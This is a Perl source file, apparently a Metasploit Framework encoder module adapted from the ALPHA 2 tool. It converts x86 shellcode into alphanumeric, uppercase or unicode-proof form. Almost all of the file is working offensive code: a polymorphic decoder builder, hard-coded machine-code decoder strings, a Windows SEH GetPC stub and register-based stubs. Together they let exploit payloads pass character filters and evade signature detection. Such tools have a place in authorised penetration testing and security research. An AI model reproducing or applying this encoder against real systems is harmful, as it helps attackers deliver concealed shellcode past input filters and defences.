
use strict;
package Msf::Encoder::SkyAlphaNum;
use base 'Msf::Encoder';
use Pex::Poly::BlockMaster;
use Pex::Poly::DeltaKing;
use Pex::Poly::RegAssassin;

my $bmb = 'Pex::Poly::BlockMaster::Block';

q{
#define VERSION_STRING "ALPHA 2: Zero-tolerance. (build 07)"
#define COPYRIGHT      "Copyright (C) 2003, 2004 by Berend-Jan Wever."
/*
________________________________________________________________________________

    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance.
   SS"  Y$P"  SY"  ,SY 
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding.
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>
________________________________________________________________________________

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

Acknowledgements:
  Thanks to rix for his phrack article on aphanumeric shellcode.
  Thanks to obscou for his phrack article on unicode-proof shellcode.
  Thanks to Costin Ionescu for the idear behind w32 SEH GetPC code.
*/
};

sub Version {
  my $version = q{
________________________________________________________________________________

    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance. (build 07)
   SS"  Y$P"  SY"  ,SY
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding.
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>
________________________________________________________________________________};
}

sub Help {
  my $help = q{
Usage: [OPTION] [BASEADDRESS]
ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.
The result can optionaly be uppercase-only and/or unicode proof. It is a encoded
version of your origional shellcode. It consists of baseaddress-code with some
padding, a decoder routine and the encoded origional shellcode. This will work
for any target OS. The resulting shellcode needs to have RWE-access to modify
it's own code and decode the origional shellcode in memory.

BASEADDRESS
  The decoder routine needs have it's baseaddress in specified register(s). The
  baseaddress-code copies the baseaddress from the given register or stack
  location into the apropriate registers.
eax, ecx, edx, ecx, esp, ebp, esi, edi
  Take the baseaddress from the given register. (Unicode baseaddress code using
  esp will overwrite the byte of memory pointed to by ebp!)
[esp], [esp-X], [esp+X]
  Take the baseaddress from the stack.
seh
  The windows "Structured Exception Handler" (seh) can be used to calculate
  the baseaddress automatically on win32 systems. This option is not available
  for unicode-proof shellcodes and the uppercase version isn't 100% reliable.
nops
  No baseaddress-code, just padding.  If you need to get the baseaddress from a
  source not on the list use this option (combined with --nocompress) and
  replace the nops with your own code. The ascii decoder needs the baseaddress
  in registers ecx and edx, the unicode-proof decoder only in ecx.
-n
  Do not output a trailing newline after the shellcode.
--nocompress
  The baseaddress-code uses "dec"-instructions to lower the required padding
  length. The unicode-proof code will overwrite some bytes in front of the
  shellcode as a result. Use this option if you do not want the "dec"-s.
--unicode
  Make shellcode unicode-proof. This means it will only work when it gets
  converted to unicode (inserting a '0' after each byte) before it gets
  executed.
--uppercase
  Make shellcode 100% Uppercase characters, uses a few more bytes then
  mixedcase shellcodes.
--sources
  Output a list of BASEADDRESS options for the given combination of --uppercase
  and --unicode.
--help
  Display this help and exit
--version
  Output version information and exit

See the source-files for further details and copying conditions. There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

Acknowledgements:
  Thanks to rix for his phrack article on aphanumeric shellcode.
  Thanks to obscou for his phrack article on unicode-proof shellcode.
  Thanks to Costin Ionescu for the idear behind w32 SEH GetPC code.

Report bugs to <skylined@edup.tudelft.nl>
};
}

sub _Encode {
  my $self = shift;
  my $raw = shift;
  my $encoder = shift;
  my $type = shift;

  my $stub;
  my $decoder;
  my $encoded;

  if($encoder eq 'mixed') {
    $decoder = $self->_MakeDecoder;
    $stub = $self->_MakeStub($type);
    $encoded = $self->EncodeData($raw);
  }
  elsif($encoder eq 'upper') {
    $decoder = $self->_MakeUpperDecoder;
    $stub = $self->_MakeUpperStub($type);
    $encoded = $self->EncodeData($raw);
  }
  elsif($encoder eq 'unicodeMixed') {
    $decoder = $self->_MakeUnicodeDecoder;
    $stub = $self->_MakeUnicodeStub($type);
    $encoded = $self->EncodeData($raw, 'unicode' => 1);
  }
  elsif($encoder eq 'unicodeUpper') {
    $decoder = $self->_MakeUnicodeUpperDecoder;
    $stub = $self->_MakeUnicodeUpperStub($type);
    $encoded = $self->EncodeData($raw, 'unicode' => 1);
  }
  elsif($encoder eq 'mixedNocompress') {
    $decoder = $self->_MakeDecoder;
    $stub = $self->_MakeNocompressStub($type);
    $encoded = $self->EncodeData($raw);
  }
  elsif($encoder eq 'upperNocompress') {
    $decoder = $self->_MakeUpperDecoder;
    $stub = $self->_MakeUpperNocompressStub($type);
    $encoded = $self->EncodeData($raw);
  }
  elsif($encoder eq 'unicodeMixedNocompress') {
    $decoder = $self->_MakeUnicodeDecoder;
    $stub = $self->_MakeUnicodeNocompressStub($type);
    $encoded = $self->EncodeData($raw, 'unicode' => 1);
  }
  elsif($encoder eq 'unicodeUpperNocompress') {
    $decoder = $self->_MakeUnicodeUpperDecoder;
    $stub = $self->_MakeUnicodeUpperNocompressStub($type);
    $encoded = $self->EncodeData($raw, 'unicode' => 1);
  }

  if(!defined($stub)) {
    $self->PrintDebugLine(3, "Failed to build stub for $type");
    return;
  }
  if(!defined($decoder)) {
    $self->PrintDebugLine(3, "Failed to build decoder for $encoder");
    return;
  }
  if(!defined($encoded) && length($raw) > 0) {
    $self->PrintDebugLine(3, "Failed to encoder raw payload data");
    return;
  }
  return($stub . $decoder . $encoded);
}

sub _ValidChars {
  my $self = shift;
  return('0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ');
}
sub _Terminator {
  my $self = shift;
  return('A');
}

sub EncodeData {
  my $self = shift;
  my $raw = shift;
  my %options = @_;

  my $validChars = $options{'validChars'};
  $validChars = $self->_ValidChars if(!defined($validChars));
  my $unicode = $options{'unicode'};
  my $noterm = $options{'dontTerminate'};

  my @validChars = split('', $validChars);

#  $unicode = 1;

  my $data;

  # Optimization, or something.
  my $vlength = length($validChars);

  foreach my $char (split('', $raw)) {

    # I've found this the best way to do randomization
    Pex::Utils::FisherYates(\@validChars);

    # seperate the original byte into 2 nibbles
    my $o1 = (ord($char) & 0xf0) >> 4;
    my $o2 = (ord($char) & 0x0f);

    my $e2;
    foreach my $c (@validChars) {
      if((ord($c) & 0x0f) == $o2) {
        $e2 = ord($c) >> 4;
        last;
      }
    }
    return if(!defined($e2));

    # Randomize again... :)
    Pex::Utils::FisherYates(\@validChars);

    # // normal code uses xor, unicode-proof uses ADD.
    # // AB -> 
    my $D = $unicode ? ($o1 - $e2) & 0x0f : ($o1 ^ $e2);
    # // C is arbitrary as long as CD is a valid character

    my $e1;
    foreach my $c (@validChars) {
#      print STDERR ".\n";
      if((ord($c) & 0x0f) == $D) {
 #       $e1 = ord($c) >> 4;
       $e1 = ord($c);
        last;
      }
    }
    return if(!defined($e1));

    $data .= chr($e1) . chr(($e2 << 4) + $o2);

  }

  $data .= $self->_Terminator if(!$noterm);
  return($data);
}


#
# Win32 SEH GetPC code, puts EIP in ecx
#
sub _MakeW32SehGetPc {
  my $self = shift;
  my $w32SehGetPc = 
    'VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089';
  return($w32SehGetPc);
}
sub _MakeUpperW32SehGetPc {
  my $self = shift;
  my $upperW32SehGetPc = 
    'VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYYP5YYYD5KKYAPTTX638TDDNVDDX4Z4A63861816';
  return($upperW32SehGetPc);
}

#
# Ascii Mixedcase Decoder / Stubs
#


# needs work still...
sub _MakeDecoderPoly {
  my $self = shift;

  my $push41 = $bmb->new('push byte 0x41', '[>0 head<]j' . $self->_Terminator);

  my $popEax = $bmb->new('pop eax (0x41)', 'X');
  $popEax->AddDepend($push41);

  my $pushEax = $bmb->new('push eax', 'P');
  $pushEax->AddDepend($popEax);

  my $xorImul = $bmb->new('xor (fix imul)');
  foreach my $a ('0A', '0B') { # 0A0...
    $xorImul->AddBlock($a . '[>1 chr(:imul: - :head: + 0x28)<]');
  }
  $xorImul->AddDepend($popEax);

  my $loopTop = $bmb->new('_loopTop', '');
  $loopTop->AddDepend($pushEax, $xorImul);

  my $incEcx1 = $bmb->new('inc ecx', '[>1 chr(0x40 + ||REG1||)<]');
  $incEcx1->AddDepend($loopTop);

  my $imul = $bmb->new('imul', '[>0 imul<]k[>1 chr(0x40 + ||REG1||)<]A' . chr(ord($self->_Terminator) + 0x10));
  $imul->AddDepend($incEcx1);

  my $xor1 = $bmb->new('xor decode', '[>0 xord<]2[>1 chr(0x40 + ||REG1||)<][>1 chr(:incEcx2: < :xord: ? 0x41 : 0x42)<]');
  $xor1->AddDepend($imul);

  my $xor2 = $bmb->new('xor save1', '[>0 xors1<]2[>1 chr(0x40 + ||REG2||)<][>1 chr(:incEdx: < :xors1: ? 0x41 : 0x42)<]');
  $xor2->AddDepend($xor1);

  my $xor3 = $bmb->new('xor save2', '[>0 xors2<]0[>1 chr(0x40 + ||REG2||)<][>1 chr(:incEdx: < :xors2: ? 0x41 : 0x42)<]');
  $xor3->AddDepend($xor2);

  my $incEcx2 = $bmb->new('inc ecx 2', '[>0 incEcx2<][>1 chr(0x40 + ||REG1||)<]');
  $incEcx2->AddDepend($imul);
  my $incEdx = $bmb->new('inc edx', '[>0 incEdx<][>1 chr(0x40 + ||REG2||)<]');
  $incEdx->AddDepend($loopTop);

  my $popEax2 = $bmb->new('pop eax 2', 'X');
  $popEax2->AddDepend($xor3);

  my $pushEax2 = $bmb->new('push eax 2', 'P');
  $pushEax2->AddDepend($popEax2);

  my $cmp = $bmb->new('cmp', '8[>1 chr(0x40 + ||REG1||)<]B');
  $cmp->AddDepend($popEax2, $incEcx2, $incEdx);

  my $jmp = $bmb->new('jnz', 'u');
  $jmp->AddDepend($cmp, $pushEax2);

  my $block;
  $block = Pex::Poly::BlockMaster->new($push41);
  $block = Pex::Poly::RegAssassin->new($block->Build);
  $block->AddSet([ 'REG1', 'REG2' ], [ 1, 2 ]); # ecx amd edx
  $block = Pex::Poly::DeltaKing->new($block->Build);
  return($block->Build);
}

sub _MakeDecoder {
  my $self = shift;
  my $decoder = 
#    'jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI';
#    'jAXP0A0AkAAQ2AB2BB0BBABXP8ABu' . $self->EncodeData("\xe9", dontTerminate => 1);
    $self->_MakeDecoderPoly . $self->EncodeData("\xe9", dontTerminate => 1);
  return($decoder);
}
sub _RandomInsert {
  my $self = shift;
  my $string = shift;
  my $inserts = shift || [ ];

  foreach my $insert (@{$inserts}) {
    substr($string, int(rand(length($string) + 1)), 0, $insert);
  }
  return($string);
}

sub _MakeStubDecer {
  my $self = shift;
  my $num = shift;
  my $data;

  if(int(rand(2)) == 1) {
    $data = 'Y' . ('I' x $num) . 'QZ';
  }
  else {
    $data = 'Z' . ('J' x $num) . 'RY';
  }
  return($data);
}
sub _MakeStubPoper {
  my $self = shift;
  my $num = shift;

  # eax gets destroyed in the decoder anyway, so no problems with smashing it
  my @pops = ('Y', 'Z', 'X');
  my $stub;

  for(my $i = 0; $i < $num; $i++) {
    $stub .= $pops[int(rand(@pops))];
  }
  return($stub);
}

sub _MakeStub {
  my $self = shift;
  my $type = shift;

  my $prepend = '';

  if($type eq 'seh') {
    $prepend = $self->_MakeW32SehGetPc;
    $type = 'ecx';
  }

# Note, possible other nop besides 7 (aaa) is H (dec eax)
# or dec ecx/edx depending on placement (trickier)
# should incorporate that sometime

  # these are just the always safe ones
  my $nop = int(rand(2)) ? '7' : 'H';

  # nops, 18 decs
  if($type eq 'nops') {
    return($self->_RandomInsert('IIIIIIIIIIIIIIIIII', [ $nop ]));
  }

  # Eax stub, 16 decs...
  elsif($type eq 'eax') {
    # just make sure the nop doesn't come before the push eax, incase
    # for some reason that would modify eax.. (aaa), or for sure dec eax would
    my $stub = $self->_MakeStubDecer(16);
    return('P' . $self->_RandomInsert($stub, [ $nop ]));
  }

  # Ecx stub, 17 decs, can't do ecx/edx swap for obvious reasons
  elsif($type eq 'ecx') {
    return($prepend . $self->_RandomInsert('IIIIIIIIIIIIIIIIIQZ', [ $nop ]));
  }

  # Edx stub, 17 decs, can't do ecx/edx swap for obvious reasons
  elsif($type eq 'edx') {
    return($self->_RandomInsert('JJJJJJJJJJJJJJJJJRY', [ $nop ]));
  }

  # All of these are just push/pop reg moves, with 16 decs
  elsif($type eq 'ebx') {
    my $stub = $self->_MakeStubDecer(16);
    return($self->_RandomInsert('S' . $stub, [ $nop ]));
  }
  elsif($type eq 'esp') {
    my $stub = $self->_MakeStubDecer(16);
    return($self->_RandomInsert('T' . $stub, [ $nop ]));
  }
  elsif($type eq 'ebp') {
    my $stub = $self->_MakeStubDecer(16);
    return($self->_RandomInsert('U' . $stub, [ $nop ]));
  }

  elsif($type eq 'esi') {
    my $stub = $self->_MakeStubDecer(16);
    return($self->_RandomInsert('V' . $stub, [ $nop ]));
  }
  elsif($type eq 'edi') {
    my $stub = $self->_MakeStubDecer(16);
    return($self->_RandomInsert('W' . $stub, [ $nop ]));
  }

  # Note: if you didn't care about what's on the stack, this stubs can be made
  # shorter, for example, the esp-10 stub could be
  # QQQLLLL . StubDecer(13) plus a nop (ie QQQLLLLZJJJJJJJJJJJJJ7RY)
  # that is 24 bytes vs 28 bytes

  # [esp-10], 16 esp decs, 9 ecx decs
  elsif($type eq '[esp-10]') {
    my $stub = $self->_MakeStubDecer(9);
    return('LLLLLLLLLLLLLLLL' . $stub);
  }
  # [esp-c], 12 esp decs, 11 ecx decs
  elsif($type eq '[esp-c]') {
    my $stub = $self->_MakeStubDecer(11);
    return('LLLLLLLLLLLL' . $stub);
  }
  # [esp-8], 8 esp decx, 13 ecx decs
  elsif($type eq '[esp-8]') {
    my $stub = $self->_MakeStubDecer(13);
    return('LLLLLLLL' . $stub);
  }
  # [esp-4], 4 esp decx, 15 ecx decs
  elsif($type eq '[esp-4]') {
    my $stub = $self->_MakeStubDecer(15);
    return('LLLL' . $stub);
  }
  # [esp], 17 ecx decs
  elsif($type eq '[esp]') {
    my $stub = $self->_MakeStubDecer(17);
    return($stub);
  }

  # [esp+4], 1 pop, 16 decs
  elsif($type eq '[esp+4]') {
    my $stub = $self->_MakeStubPoper(1) . $self->_MakeStubDecer(16);
    return($self->_RandomInsert($stub, [ $nop ]));
  }
  # [esp+8], 2 pops, 16 decs
  elsif($type eq '[esp+8]') {
    my $stub = $self->_MakeStubPoper(2) . $self->_MakeStubDecer(16);
    return($stub);
  }
  # [esp+c], 3 pops, 15 decs
  elsif($type eq '[esp+c]') {
    my $stub = $self->_MakeStubPoper(3) . $self->_MakeStubDecer(15);
    return($self->_RandomInsert($stub, [ $nop ]));
  }
  # [esp+10], 4 pops, 15 decs
  elsif($type eq '[esp+10]') {
    my $stub = $self->_MakeStubPoper(4) . $self->_MakeStubDecer(15);
    return($stub);
  }
  # [esp+14], 5 pops, 14 decs
  elsif($type eq '[esp+14]') {
    my $stub = $self->_MakeStubPoper(5) . $self->_MakeStubDecer(14);
    return($self->_RandomInsert($stub, [ $nop ]));
  }
  # [esp+18], 6 pops, 14 decs
  elsif($type eq '[esp+18]') {
    my $stub = $self->_MakeStubPoper(6) . $self->_MakeStubDecer(14);
    return($stub);
  }
  # [esp+1c], 7 pops, 13 decs
  elsif($type eq '[esp+1c]') {
    my $stub = $self->_MakeStubPoper(7) . $self->_MakeStubDecer(13);
    return($self->_RandomInsert($stub, [ $nop ]));
  }
  # we could continue, simple pattern...

  return;

# old stubs..
  my $stubs = {
    'nops'      => 'IIIIIIIIIIIIIIIIII7',
    'eax'       => 'PYIIIIIIIIIIIIIIII7QZ',
    'ecx'       => 'IIIIIIIIIIIIIIIII7QZ',
    'edx'       => 'JJJJJJJJJJJJJJJJJ7RY',
    'ebx'       => 'SYIIIIIIIIIIIIIIII7QZ',
    'esp'       => 'TYIIIIIIIIIIIIIIII7QZ',
    'ebp'       => 'UYIIIIIIIIIIIIIIII7QZ',
    'esi'       => 'VYIIIIIIIIIIIIIIII7QZ',
    'edi'       => 'WYIIIIIIIIIIIIIIII7QZ',
    '[esp-10]'  => 'LLLLLLLLLLLLLLLLYIIIIIIIIIQZ',
    '[esp-C]'   => 'LLLLLLLLLLLLYIIIIIIIIIIIQZ',
    '[esp-8]'   => 'LLLLLLLLYIIIIIIIIIIIIIQZ',
    '[esp-4]'   => 'LLLL7YIIIIIIIIIIIIII7QZ',
    '[esp]'     => 'YIIIIIIIIIIIIIIIIIQZ',
    '[esp+4]'   => 'YYIIIIIIIIIIIIIIII7QZ',
    '[esp+8]'   => 'YYYIIIIIIIIIIIIIIIIQZ',
    '[esp+C]'   => 'YYYYIIIIIIIIIIIIIII7QZ',
    '[esp+10]'  => 'YYYYYIIIIIIIIIIIIIIIQZ',
    '[esp+14]'  => 'YYYYYYIIIIIIIIIIIIII7QZ',
    '[esp+18]'  => 'YYYYYYYIIIIIIIIIIIIIIQZ',
    '[esp+1C]'  => 'YYYYYYYYIIIIIIIIIIIII7QZ',
  };


}

#
# Ascii Uppercase Decoder / Stubs
#
sub _MakeUpperDecoder {
  my $self = shift;
  my $upperDecoder =
    'VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI';
  return($upperDecoder);
}

sub _MakeUpperStub {
  my $self = shift;
  my $type = shift;

  my $upperStubs = {
    'nops'      => 'IIIIIIIIIIII',
    'eax'       => 'PYIIIIIIIIIIQZ',
    'ecx'       => 'IIIIIIIIIIIQZ',
    'edx'       => 'JJJJJJJJJJJRY',
    'ebx'       => 'SYIIIIIIIIIIQZ',
    'esp'       => 'TYIIIIIIIIIIQZ',
    'ebp'       => 'UYIIIIIIIIIIQZ',
    'esi'       => 'VYIIIIIIIIIIQZ',
    'edi'       => 'WYIIIIIIIIIIQZ',
    '[esp-10]'  => 'LLLLLLLLLLLLLLLLYII7QZ',
    '[esp-C]'   => 'LLLLLLLLLLLLYIIII7QZ',
    '[esp-8]'   => 'LLLLLLLLYIIIIII7QZ',
    '[esp-4]'   => 'LLLL7YIIIIIIIIQZ',
    '[esp]'     => 'YIIIIIIIIII7QZ',
    '[esp+4]'   => 'YYIIIIIIIIIIQZ',
    '[esp+8]'   => 'YYYIIIIIIIII7QZ',
    '[esp+C]'   => 'YYYYIIIIIIIIIQZ',
    '[esp+10]'  => 'YYYYYIIIIIIII7QZ',
    '[esp+14]'  => 'YYYYYYIIIIIIIIQZ',
    '[esp+18]'  => 'YYYYYYYIIIIIII7QZ',
    '[esp+1C]'  => 'YYYYYYYYIIIIIIIQZ',
  };

  $upperStubs->{'seh'} = $self->_MakeUpperW32SehGetPc . $upperStubs->{'ecx'};

  return($upperStubs->{$type});
}
  
#
# Unicode Mixedcase Decoder / Stubs
#
sub _MakeUnicodeDecoder {
  my $self = shift;
  my $unicodeDecoder = 
    'jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA'.
    'ZBABABABABkMAGB9u4JB';
  return($unicodeDecoder);
}
sub _MakeUnicodeStub {
  my $self = shift;
  my $type = shift;

  my $unicodeStubs = {
    'nops'     => 'IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444',
    'eax'      => 'PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'ecx'      => 'IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444',
    'edx'      => 'RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'ebx'      => 'SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'esp'      => 'TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'ebp'      => 'UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'esi'      => 'VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'edi'      => 'WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    '[esp]'    => 'YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44',
    '[esp+4]'  => 'YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
  };
  return($unicodeStubs->{$type});
}

#
# Unicode Uppercase Decoder / Stubs
#
sub _MakeUnicodeUpperDecoder {
  my $self = shift;
  my $unicodeUpperDecoder = 
    'QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB'.
    'QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB';
  return($unicodeUpperDecoder);
}
sub _MakeUnicodeUpperStub {
  my $self = shift;
  my $type = shift;

  my $unicodeUpperStubs = {
    'nops'     => 'IAIAIAIA4444',
    'eax'      => 'PPYAIAIAIAIA',
    'ecx'      => 'IAIAIAIA4444',
    'edx'      => 'RRYAIAIAIAIA',
    'ebx'      => 'SSYAIAIAIAIA',
    'esp'      => 'TUYAIAIAIAIA',
    'ebp'      => 'UUYAIAIAIAIA',
    'esi'      => 'VVYAIAIAIAIA',
    'edi'      => 'WWYAIAIAIAIA',
    '[esp]'    => 'YAIAIAIAIA44',
    '[esp+4]'  => 'YUYAIAIAIAIA',
  };
  return($unicodeUpperStubs->{$type});
}


#
# Ascii Mixedcase Nocompress Stubs
#
sub _MakeNocompressStub {
  my $self = shift;
  my $type = shift;

  my $nocompressStubs = {
    'nops'      => '7777777777777777777777777777777777777',
    'eax'       => 'PY777777777777777777777777777777777QZ',
    'ecx'       => '77777777777777777777777777777777777QZ',
    'edx'       => '77777777777777777777777777777777777RY',
    'ebx'       => 'SY777777777777777777777777777777777QZ',
    'esp'       => 'TY777777777777777777777777777777777QZ',
    'ebp'       => 'UY777777777777777777777777777777777QZ',
    'esi'       => 'VY777777777777777777777777777777777QZ',
    'edi'       => 'WY777777777777777777777777777777777QZ',
    '[esp-10]'  => 'LLLLLLLLLLLLLLLLY777777777777777777QZ',
    '[esp-C]'   => 'LLLLLLLLLLLLY7777777777777777777777QZ',
    '[esp-8]'   => 'LLLLLLLLY77777777777777777777777777QZ',
    '[esp-4]'   => 'LLLL7Y77777777777777777777777777777QZ',
    '[esp]'     => 'Y7777777777777777777777777777777777QZ',
    '[esp+4]'   => 'YY777777777777777777777777777777777QZ',
    '[esp+8]'   => 'YYY77777777777777777777777777777777QZ',
    '[esp+C]'   => 'YYYY7777777777777777777777777777777QZ',
    '[esp+10]'  => 'YYYYY777777777777777777777777777777QZ',
    '[esp+14]'  => 'YYYYYY77777777777777777777777777777QZ',
    '[esp+18]'  => 'YYYYYYY7777777777777777777777777777QZ',
    '[esp+1C]'  => 'YYYYYYYY777777777777777777777777777QZ',
  };

  $nocompressStubs->{'seh'} = $self->_MakeW32SehGetPc . $nocompressStubs->{'ecx'};
  return($nocompressStubs->{$type});
}

#
# Ascii Uppercase Nocompress Stubs
#
sub _MakeUpperNocompressStub {
  my $self = shift;
  my $type = shift;

  my $upperNocompressStubs = {
    'nops'      => '777777777777777777777777',
    'eax'       => 'PY77777777777777777777QZ',
    'ecx'       => '7777777777777777777777QZ',
    'edx'       => '7777777777777777777777RY',
    'ebx'       => 'SY77777777777777777777QZ',
    'esp'       => 'TY77777777777777777777QZ',
    'ebp'       => 'UY77777777777777777777QZ',
    'esi'       => 'VY77777777777777777777QZ',
    'edi'       => 'WY77777777777777777777QZ',
    '[esp-10]'  => 'LLLLLLLLLLLLLLLLY77777QZ',
    '[esp-C]'   => 'LLLLLLLLLLLLY777777777QZ',
    '[esp-8]'   => 'LLLLLLLLY7777777777777QZ',
    '[esp-4]'   => 'LLLL7Y7777777777777777QZ',
    '[esp]'     => 'Y777777777777777777777QZ',
    '[esp+4]'   => 'YY77777777777777777777QZ',
    '[esp+8]'   => 'YYY7777777777777777777QZ',
    '[esp+C]'   => 'YYYY777777777777777777QZ',
    '[esp+10]'  => 'YYYYY77777777777777777QZ',
    '[esp+14]'  => 'YYYYYY7777777777777777QZ',
    '[esp+18]'  => 'YYYYYYY777777777777777QZ',
    '[esp+1C]'  => 'YYYYYYYY77777777777777QZ',
  };

  $upperNocompressStubs->{'seh'} = $self->_MakeUpperW32SehGetPc . $upperNocompressStubs->{'ecx'};

  return($upperNocompressStubs->{$type});
}

#
# Unicode Mixedcase Nocompress Stubs
#
sub _MakeUnicodeNocompressStub {
  my $self = shift;
  my $type = shift;

  my $unicodeNocompressStubs = {
    'nops'     => '444444444444444444444444444444444444444',
    'eax'      => 'PPYA44444444444444444444444444444444444',
    'ecx'      => '444444444444444444444444444444444444444',
    'edx'      => 'RRYA44444444444444444444444444444444444',
    'ebx'      => 'SSYA44444444444444444444444444444444444',
    'esp'      => 'TUYA44444444444444444444444444444444444',
    'ebp'      => 'UUYA44444444444444444444444444444444444',
    'esi'      => 'VVYA44444444444444444444444444444444444',
    'edi'      => 'WWYA44444444444444444444444444444444444',
    '[esp]'    => 'YA4444444444444444444444444444444444444',
    '[esp+4]'  => 'YUYA44444444444444444444444444444444444',
  };

  return($unicodeNocompressStubs->{$type});
}

#
# Unicode Uppercase Nocompress Stubs
#
sub _MakeUnicodeUpperNocompressStub {
  my $self = shift;
  my $type = shift;

  my $unicodeUpperNocompressStubs = {
    'nops'    => '44444444444444',
    'eax'     => 'PPYA4444444444',
    'ecx'     => '44444444444444',
    'edx'     => 'RRYA4444444444',
    'ebx'     => 'SSYA4444444444',
    'esp'     => 'TUYA4444444444',
    'ebp'     => 'UUYA4444444444',
    'esi'     => 'VVYA4444444444',
    'edi'     => 'WWYA4444444444',
    '[esp]'   => 'YA444444444444',
    '[esp+4]' => 'YUYA4444444444',
  };
  return($unicodeUpperNocompressStubs->{$type});
}

1;
